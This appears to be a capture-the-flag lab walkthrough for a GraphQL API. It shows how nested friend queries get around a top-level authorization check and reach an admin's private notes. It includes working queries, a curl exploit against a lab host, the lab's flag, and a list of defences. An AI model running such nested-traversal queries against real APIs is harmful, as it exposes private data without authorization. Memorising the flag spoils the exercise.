<!-- Introduction -->
<p>
    The Blog API has circular references between User and Friends with no depth limiting.
    The admin user's <code>privateNotes</code> are protected at the top level (returns null),
    but accessible through deeply nested friend traversal:
    <code>alice -> bob -> charlie -> admin</code>. At the nested level, the authorization
    check is bypassed and the notes (with the flag) are returned.
</p>

<h4>Step 1: Explore the Schema</h4>
<p>Discover the types and their relationships.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Schema Discovery</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">User: </span>id (Int), username (String), email (String), friends ([User]), privateNotes (Note)<br>
        <span class="prompt">Note: </span>id (Int), content (String), secret (String)<br>
        <span class="prompt">Query: </span>user(id: Int), users<br><br>
        <span class="prompt">Circular: </span>User -> friends -> [User] -> friends -> [User] ...
    </div>
</div>

<h4>Step 2: Test Direct Access to Admin Notes</h4>
<p>Admin's privateNotes are protected at the top level.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Direct Access (Blocked)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Query: </span>{ user(id: 1) { username privateNotes { id content secret } } }<br>
        <span class="prompt">Result: </span>{"username": "admin", "privateNotes": <strong>null</strong>}<br><br>
        <span class="prompt">Note: </span>Admin's notes are null at top level -- protected!
    </div>
</div>

<h4>Step 3: Map the Friend Graph</h4>
<p>Explore user friendships to find a path to admin through nesting.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Friend Graph</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Query: </span>{ user(id: 2) { username friends { id username } } }<br>
        <span class="prompt">alice's friends: </span>[bob (id:3)]<br><br>
        <span class="prompt">Query: </span>{ user(id: 3) { username friends { id username } } }<br>
        <span class="prompt">bob's friends: </span>[charlie (id:4)]<br><br>
        <span class="prompt">Query: </span>{ user(id: 4) { username friends { id username } } }<br>
        <span class="prompt">charlie's friends: </span>[admin (id:1)]<br><br>
        <span class="prompt">Path: </span>alice(2) -> bob(3) -> charlie(4) -> <strong>admin(1)</strong>
    </div>
</div>

<h4>Step 4: Exploit Nested Access to Admin's Notes</h4>
<p>
    Traverse the friend chain: alice -> bob -> charlie -> admin. At the deeply nested level,
    the authorization check on <code>privateNotes</code> is bypassed.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Nested Traversal Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Query:</span><br>
        { user(id: 2) {<br>
        &nbsp;&nbsp;username<br>
        &nbsp;&nbsp;friends {<br>
        &nbsp;&nbsp;&nbsp;&nbsp;username<br>
        &nbsp;&nbsp;&nbsp;&nbsp;friends {<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;username<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;friends {<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;username<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;privateNotes { id content secret }<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
        &nbsp;&nbsp;&nbsp;&nbsp;}<br>
        &nbsp;&nbsp;}<br>
        } }<br><br>
        <span class="prompt">Response:</span><br>
        alice -> bob -> charlie -> admin:<br>
        &nbsp;&nbsp;privateNotes: [{<br>
        &nbsp;&nbsp;&nbsp;&nbsp;"id": 1,<br>
        &nbsp;&nbsp;&nbsp;&nbsp;"content": "Admin private notes",<br>
        &nbsp;&nbsp;&nbsp;&nbsp;"secret": "<strong>FLAG{gq_n3st3d_d33p_qu3ry}</strong>"<br>
        &nbsp;&nbsp;}]
    </div>
</div>

<h4>Step 5: Submit the Flag</h4>
<p>
    Copy the flag from the nested privateNotes.secret: <code>FLAG{gq_n3st3d_d33p_qu3ry}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -X POST http://target:4000/graphql/lab5 \<br>
        &nbsp;&nbsp;-H "Content-Type: application/json" \<br>
        &nbsp;&nbsp;-d '{"query":"{ user(id: 2) { friends { friends { friends { username privateNotes { secret } } } } } }"}'
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Circular references in GraphQL schemas without depth limiting
    enable both DoS (exponential resolver calls) and authorization bypass. In this lab, admin's
    <code>privateNotes</code> are protected at the top level (return null) but accessible through
    nested friend traversal (depth 4: alice -> bob -> charlie -> admin). The authorization check
    only runs at the top level, not when the user is reached through nesting. Defense: implement
    query depth limiting (<code>graphql-depth-limit</code>), enforce authorization at every
    resolver level regardless of nesting depth, use query complexity analysis
    (<code>graphql-query-complexity</code>), and add execution timeouts.
</div>
